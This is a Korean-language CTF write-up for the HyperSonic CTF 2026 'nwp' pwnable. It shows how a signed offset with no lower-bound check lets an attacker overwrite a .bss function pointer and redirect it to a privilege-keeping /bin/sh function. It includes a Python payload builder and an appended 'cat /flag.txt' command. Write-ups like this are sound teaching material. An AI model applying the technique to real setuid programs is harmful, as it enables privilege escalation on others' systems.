---
title: "HyperSonic CTF 2026 nwp Writeup"
published: 2026-06-08
description: "HyperSonic CTF 2026 nwp 문제 풀이."
category: "CTF/Wargame"
tags: ["HyperSonic CTF", "CTF", "Writeup", "Pwnable"]
draft: false
listed: false
---

***SSG Writeup***

# nwp

## 개요

`nwp`는 작은 상태 기계로 구성된 `pwn` 문제입니다. 프로그램은 오프셋을 입력받은 뒤, `.bss` 영역의 특정 위치에 `8`바이트를 읽고 함수 포인터를 호출합니다.

확인한 조건은 다음과 같습니다.

- 카테고리: `pwnable`
- 프로그램 형식: 심볼이 제거된 64비트 ELF
- 보호 기법: non-PIE, NX stack
- 목표: 함수 포인터를 조작해 flag를 읽을 수 있는 셸을 실행합니다.

풀이에서 먼저 확인할 부분은 `.bss`에 놓인 함수 포인터와 입력 버퍼의 거리입니다. 입력 주소가 `base + offset` 형태로 계산되는데, `offset`에 대한 하한 검사가 없어 버퍼 앞쪽의 함수 포인터를 덮을 수 있습니다.

## 문제 분석

먼저 이후 설명에서 사용할 대상을 정리하겠습니다.

- `fp`: `0x403580`에 있는 함수 포인터입니다. 정상 흐름에서는 종료용 함수 주소가 들어갑니다.
- `buf`: `0x403588`에서 시작하는 입력 대상 영역입니다.
- `offset`: `scanf("%d%*c", &offset)`로 읽는 부호 있는 정수입니다.
- `priv_shell`: `0x4014d8`에 있는 함수입니다. 권한을 맞춘 뒤 `/bin/sh`를 실행합니다.

프로그램은 심볼이 제거되어 함수명이 남아 있지 않습니다. 그래도 `main` 흐름을 따라가면 상태 기계 안에서 다음 동작이 이어지는 것을 확인할 수 있습니다.

```c
*(uint64_t *)0x403580 = 0x401326;

printf("offset> ");
scanf("%d%*c", &offset);

printf("input> ");
dst = (char *)0x403588 + (int64_t)offset;
__read_chk(0, dst, 8, object_size);

((void (*)(int))*(uint64_t *)0x403580)(0);
```

`fp`는 처음에 `0x401326`으로 초기화됩니다. 해당 함수는 `_exit`로 이어지는 종료용 경로입니다. 이후 프로그램은 `offset`을 입력받고, `buf + offset` 위치에 정확히 `8`바이트를 읽습니다. 마지막에는 `fp`가 가리키는 함수를 호출합니다.

여기서 주소 관계가 중요합니다.

```text
fp  = 0x403580
buf = 0x403588
buf - fp = 8
```

따라서 `offset = -8`을 주면 쓰기 대상 주소가 바로 `fp`가 됩니다.

```text
dst = buf + offset
    = 0x403588 - 8
    = 0x403580
```

`__read_chk`를 사용하고 있지만, 이 경로에서는 음수 오프셋 자체를 막지 못합니다. `offset = -8`일 때도 `8`바이트 쓰기가 가능하므로 함수 포인터 전체를 원하는 주소로 바꿀 수 있습니다.

실행 환경 설정도 공격 방향에 영향을 줍니다. 프로그램은 `setuid`가 설정된 상태로 실행되고, flag는 해당 권한으로만 읽을 수 있습니다. 단순히 셸을 실행하는 것만으로는 부족할 수 있으므로, 실행 전 `real uid/gid`를 `effective uid/gid`와 같게 맞추는 경로를 찾아야 합니다.

일반 흐름에서 호출되지 않는 함수 중 `0x4014d8`은 다음과 같은 동작을 합니다.

```c
uid = geteuid();
setreuid(uid, uid);

gid = getegid();
setregid(gid, gid);

char *argv[] = {"/bin/sh", NULL};
execve("/bin/sh", argv, NULL);
```

`/bin/sh` 문자열은 바로 평문으로 저장되어 있지 않고, 짧은 XOR 루틴으로 복원됩니다. 복원 결과와 `execve` 호출을 확인하면 이 함수가 flag를 읽기에 적합한 셸 경로임을 알 수 있습니다.

## 핵심 아이디어

취약점은 `offset`을 부호 있는 정수로 읽은 뒤 주소 계산에 그대로 사용하는 점입니다. 정상적으로는 `buf` 뒤쪽에 `8`바이트를 쓰는 구조처럼 보이지만, 음수 값을 넣으면 기준 주소보다 앞쪽도 쓸 수 있습니다.

이 문제에서 `buf` 바로 앞에는 호출 예정인 함수 포인터가 있습니다.

```text
0x403580: fp
0x403588: buf
```

두 주소의 차이가 정확히 `8`바이트이므로, `offset = -8` 하나로 쓰기 위치를 `fp`에 맞출 수 있습니다. 그리고 프로그램은 쓰기 직후 그 함수 포인터를 호출합니다. 즉 필요한 작업은 다음 두 가지로 줄어듭니다.

```text
1. offset으로 -8을 입력한다.
2. 8바이트 입력으로 0x4014d8을 little-endian 형식으로 보낸다.
```

이후 `execve("/bin/sh", ...)`가 실행되면, 아직 입력 스트림에 남아 있는 데이터는 셸이 읽습니다. 그래서 함수 주소 뒤에 `cat /flag.txt; exit` 같은 명령을 이어 보내면 셸을 대화식으로 다루지 않고도 결과를 받을 수 있습니다.

## 풀이 과정

### Step 1. 상태 기계에서 입력 흐름 확인

프로그램 시작 후 `main`은 `jump table`을 사용하는 상태 기계처럼 동작합니다. 세부 분기는 난독화되어 있지만, 실제 공격에 필요한 흐름은 다음 순서로 이어집니다.

```text
1. 입출력 버퍼링을 끈다.
2. fp를 종료용 함수로 초기화한다.
3. offset을 부호 있는 정수로 입력받는다.
4. buf + offset 위치에 8바이트를 읽는다.
5. fp를 호출한다.
```

이 단계에서 `offset`이 부호 있는 정수라는 점을 확인했습니다. 별도의 하한 검사가 없으므로 음수 값을 주소 계산에 넣을 수 있습니다.

### Step 2. 함수 포인터 덮기 위치 계산

입력 버퍼와 함수 포인터는 모두 `.bss`에 있습니다. 주소는 각각 다음과 같습니다.

```text
fp  = 0x403580
buf = 0x403588
```

프로그램이 실제로 쓰는 목적지는 `buf + offset`입니다. `fp`를 덮으려면 이 값이 `0x403580`이 되어야 합니다.

```text
buf + offset = fp
0x403588 + offset = 0x403580
offset = -8
```

따라서 첫 번째 입력은 `-8`입니다. 그다음 `read`는 정확히 `8`바이트를 읽으므로, 덮을 주소 하나를 `little-endian`으로 보내면 됩니다.

### Step 3. 권한을 유지하는 셸 경로 선택

프로그램 안에는 `execve`로 이어지는 함수가 여러 개 보입니다. 이 중 유용한 경로는 `0x4014d8`입니다. 이 함수는 셸을 실행하기 전에 `effective uid/gid`를 읽고, `real uid/gid`도 같은 값으로 맞춥니다.

```text
setreuid(geteuid(), geteuid())
setregid(getegid(), getegid())
execve("/bin/sh", ...)
```

`setuid` 프로그램에서 `/bin/sh`를 실행할 때 권한이 기대와 다르게 떨어질 수 있습니다. 이 경로는 `execve` 전에 `real uid/gid`를 `effective uid/gid`와 같게 맞추므로, flag를 읽는 데 필요한 권한을 유지할 수 있습니다.

### Step 4. 남은 입력을 셸 명령으로 사용

`read`가 소비하는 데이터는 함수 주소 `8`바이트뿐입니다. 그 뒤에 이어 붙인 데이터는 셸이 실행된 뒤 표준 입력으로 전달됩니다.

최종 payload 구조는 다음과 같습니다.

```text
"-8\n" || p64(0x4014d8) || "cat /flag.txt; exit\n"
```

프로그램은 `offset`을 읽고, `p64(0x4014d8)`로 `fp`를 덮은 뒤, 곧바로 `fp(0)`을 호출합니다. 이후 실행된 셸이 남은 명령을 처리하면서 flag를 출력합니다.

## Exploit / Solver

공격 코드의 핵심은 payload를 한 번에 보내는 것입니다. `scanf`는 `-8` 뒤의 개행을 소비하고, 다음 `read`는 바로 이어지는 `8`바이트를 함수 포인터 값으로 사용합니다.

```python
import struct


PRIV_SHELL = 0x4014D8


def build_payload(command: bytes = b"cat /flag.txt; exit\n") -> bytes:
    if not command.endswith(b"\n"):
        command += b"\n"

    return b"-8\n" + struct.pack("<Q", PRIV_SHELL) + command
```

네트워크 연결이나 로컬 프로세스에 위 payload를 그대로 전달하면 됩니다. 주소가 고정되어 있으므로 별도의 leak은 필요하지 않습니다.

## 결과

실행 결과, 셸이 전달한 명령을 처리하면서 다음 flag를 출력했습니다.

```text
hs{https://clickjacking.me/}
```
